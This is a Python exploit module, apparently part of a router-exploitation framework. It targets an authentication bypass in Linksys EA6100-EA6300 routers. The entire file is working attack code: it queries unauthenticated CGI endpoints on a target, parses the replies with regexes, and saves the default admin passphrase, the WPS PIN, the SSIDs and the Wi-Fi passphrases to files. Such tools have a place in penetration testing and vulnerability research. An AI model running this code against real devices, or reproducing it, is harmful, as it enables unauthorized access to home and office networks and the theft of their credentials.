# Name:Linksys EA6100 authentication bypass
# File:ea6100_auth_bypass.py
# Author:Ján Trenčanský
# License:
# Created: 7.12.2015
# Last modified: 7.12.2015
# Shodan Dork:
# Description: Multiple CGI scripts in the web-based administrative
# interface of the Linksys EA6100 - EA6300 Wireless Router
# allow unauthenticated access to the high-level administrative functions of the device.
# Not based on (licence prohibits it): https://www.korelogic.com/Resources/Advisories/KL-001-2015-006.txt
# Any similarities in the code are pure coincidence
# TODO get device and implement password reset wifi etc.

import core.Exploit
import core.io

import requests
import re
from interface.messages import print_error, print_yellow, print_green, print_warning, print_success, print_info
from interface.utils import lookup_mac


class Exploit(core.Exploit.RextExploit):
    """
Name:Linksys EA6100 authentication bypass
File:ea6100_auth_bypass.py
Author:Ján Trenčanský
License:
Created: 7.12.2015
Description: Multiple CGI scripts in the web-based administrative
    interface of the Linksys EA6100 - EA6300 Wireless Router
    allow unauthenticated access to the high-level administrative functions of the device.
    Not based on (license prohibits it): https://www.korelogic.com/Resources/Advisories/KL-001-2015-006.txt
    Any similarities in the code are pure coincidence

Options:
    Name        Description

    host        Target host address
    port        Target port
    """
    def __init__(self):
        core.Exploit.RextExploit.__init__(self)

    def send_payload(self, payload):
        target = "http://" + self.host + ":" + self.port + "/" + payload
        try:
            response = requests.get(target, timeout=60)
            return response.text

        except requests.RequestException:
            print_error("timeout!")

    def do_run(self, e):
        print_warning("Sending payload sysinfo")
        result = self.send_payload("sysinfo.cgi")
        if result:
            print_success("Got system information, writing to file")
            core.io.writetextfile(result, "sysinfo")
            print_info("Analyzing sysinfo...")
            regex = re.search("device::default_passphrase=(.*)", result)
            if regex:
                try:
                    print_green("Default admin passphrasse: " + regex.group(1))
                except IndexError:
                    print_error("Unable to locate passphrasse")

            regex = re.search("device::mac_addr=(.*)", result)
            if regex:
                try:
                    print_green("MAC: " + regex.group(1) + lookup_mac(regex.group(1)))
                except IndexError:
                    print_error("Unable to locate MAC")
            regex = re.search("device::default_ssid=(.*)", result)
            if regex:
                try:
                    print_green("Default SSID:: " + regex.group(1))
                except IndexError:
                    print_error("Unable to locate default SSID")
            regex = re.search("device::wps_pin=(.*)", result)
            if regex:
                try:
                    print_green("WPS Pin: " + regex.group(1))
                except IndexError:
                    print_error("Unable to locate WPS pin")
            regex = re.search("wl0_ssid=(.*)", result)
            if regex:
                try:
                    print_green("SSID: " + regex.group(1))
                except IndexError:
                    print_error("Unable to locate SSID")
            regex = re.search("wl0_passphrase=(.*)", result)
            if regex:
                try:
                    print_green("Passphrase: " + regex.group(1))
                except IndexError:
                    print_error("Unable to locate passphrase")
            regex = re.search("wl1_ssid=(.*)", result)
            if regex:
                try:
                    print_green("SSID: " + regex.group(1))
                except IndexError:
                    print_error("Unable to locate SSID")
            regex = re.search("wl1_passphrase=(.*)", result)
            if regex:
                try:
                    print_green("Passphrase: " + regex.group(1))
                except IndexError:
                    print_error("Unable to locate passphrase")
        print_yellow("Sending payload getstinfo")
        result = self.send_payload("getstinfo.cgi")
        if result:
            print_success("Got SSID hash and passphrase hash, writing to file")
            core.io.writetextfile(result, "getstinfo")
            print_success(result)

Exploit()
